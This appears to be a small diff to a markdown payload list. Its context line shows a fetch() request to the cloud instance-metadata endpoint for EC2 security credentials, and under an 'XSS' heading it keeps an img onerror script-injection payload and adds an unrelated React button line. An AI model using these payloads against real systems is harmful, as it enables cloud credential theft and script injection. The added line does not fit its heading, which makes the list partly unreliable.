@@ -20,4 +20,5 @@ fetch('https://169.254.169.254/latest/meta-data/identity-credentials/ec2/securit
 ```
 
 **XSS**:  
-```<22 foo="<img src=1 onerror=alert(1)>">test</22>```
+```<22 foo="<img src=1 onerror=alert(1)>">test</22>```  
+```<button onClick={() => setCount(count + 1)}>```  
